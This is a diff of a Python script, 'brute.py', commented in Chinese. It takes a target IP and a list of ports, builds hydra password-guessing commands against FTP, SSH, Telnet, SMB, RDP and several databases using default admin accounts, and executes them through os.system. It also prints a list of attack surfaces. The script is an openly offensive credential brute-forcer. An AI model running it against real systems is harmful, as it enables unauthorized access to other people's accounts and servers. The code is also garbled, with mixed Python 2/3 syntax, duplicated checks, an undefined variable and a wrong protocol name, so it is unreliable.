@@ -1,18 +1,54 @@
 #!/usr/bin/env python
 #coding=utf-8
-import os
 import sys
-if len(sys.argv)!=2:
-    print "python brute.py ip"
+import os
+if len(sys.argv)!=3:
+    print ("usage:python brute.py ip port")
+    print ("example:python brute.py 127.0.0.1 21,22,25")
     sys.exit()
 ip=sys.argv[1]
-command="masscan -p0-65535 "+ip+" --rate=10000 | grep open | awk '{print $4}' | tr -d [:alpha:] | tr -d / > ip.txt"
+port=sys.argv[2].split(",")
+print(ip)
+print(port)
+if "22" in port:
+    print("yes")
+
+if len(sys.argv)!=3:
+    print ("python brute.py ip port")
+    print ("usage:python brute.py 127.0.0.1 21,22,25")
+    sys.exit()
+ip=sys.argv[1]
+#command="masscan -p0-65535 "+ip+" --rate=10000 | grep open | awk '{print $4}' | tr -d [:alpha:] | tr -d / > ip.txt"
+#os.system(command)
+port=sys.argv[2].split(",")
+#第二部分，爆破的开始
+print "爆破开始:"
+#远程连接的爆破
+if "21" in port:  #ftp
+    command="hydra "+ip+" ftp -L username.txt -P password.txt -vV -t 30 -e ns"
+if "22" in port:  #ssh
+    command=command+" ; "+"hydra "+ip+" ssh -L username.txt -P password.txt -vV -t 30 -e ns"
+    os.system(command)
+if "23" in port:  #telnet
+    command=command+" ; "+"hydra "+ip+" telnet -L username.txt -P password.txt -vV -t 30 -e ns"
+if "445" in port:
+    command=command+" ; "+"hydra "+ip+" -l administrator -P password.txt smb -e ns"
+if "3389" in port:#rdp
+    command=command+" ; "+"hydra "+ip+" rdp -L username.txt -P password.txt -vV -t 30 -e ns"
+#数据库密码的爆破
+if "1433" in port:  # mssql  密码的爆破
+    command=command+" ; "+"hydra "+ip+" mssql -l sa -P password.txt -vV -t 30 -e ns"
+if "1521" in port:  #oracle
+    command=command+" ; "+"hydra "+ip+" oracle -l system -P password.txt -vV -t 30 -e ns"
+if "3306" in port:  #mysql
+    command=command+" ; "+"hydra "+mysql+" ftp -l root -P password.txt -vV -t 30 -e ns"
+if "5432" in port:  #PostgreSQL
+    command=command+" ; "+"hydra "+ip+" PostgreSQL -L username.txt -P password.txt -vV -t 30 -e ns"
+
 os.system(command)
-f=open("ip.txt")
-port=[]
-for i in f.readlines():
-    port.append(i.rstrip("\n"))
-f.close()
+print ("爆破完成!")
+
+
 print '''
  1. web类(web漏洞/敏感目录)
 第三方通用组件漏洞struts thinkphp jboss ganglia zabbix
@@ -88,36 +124,3 @@ print '''Ftp:21，ssh:22，Telnet:23，Pop3:110，
         3389远程登陆，8080中间件Tomcat，
         7001中间件Weblogic，3306 Mysql数据库(phpmyadmin)，
         1433 SQLServer数据库，5432 Postgresql数据库...'''
-#第二部分，爆破的开始
-print "爆破开始:"
-#远程连接的爆破
-if "21" in port:  #ftp
-    command="hydra "+ip+" ftp -L username.txt -P password.txt -vV -t 30 -e ns"
-    os.system(command)
-if "22" in port:  #ssh
-    command="hydra "+ip+" ssh -L username.txt -P password.txt -vV -t 30 -e ns"
-    os.system(command)
-if "23" in port:  #telnet
-    command="hydra "+ip+" telnet -L username.txt -P password.txt -vV -t 30 -e ns"
-    os.system(command)
-if "445" in port:
-    command="hydra "+ip+" -l administrator -P password.txt smb -e ns"
-    os.system(command)
-if "3389" in port:#rdp
-    command="hydra "+ip+" rdp -L username.txt -P password.txt -vV -t 30 -e ns"
-    os.system(command)
-#数据库密码的爆破
-if "1433" in port:  # mssql  密码的爆破
-    command="hydra "+ip+" mssql -l sa -P password.txt -vV -t 30 -e ns"
-    os.system(command)
-if "1521" in port:  #oracle
-    command="hydra "+ip+" oracle -l system -P password.txt -vV -t 30 -e ns"
-    os.system(command)
-if "3306" in port:  #mysql
-    command="hydra "+mysql+" ftp -l root -P password.txt -vV -t 30 -e ns"
-    os.system(command)
-if "5432" in port:  #PostgreSQL
-    command="hydra "+ip+" PostgreSQL -L username.txt -P password.txt -vV -t 30 -e ns"
-    os.system(command)
-
-print "爆破完成!"
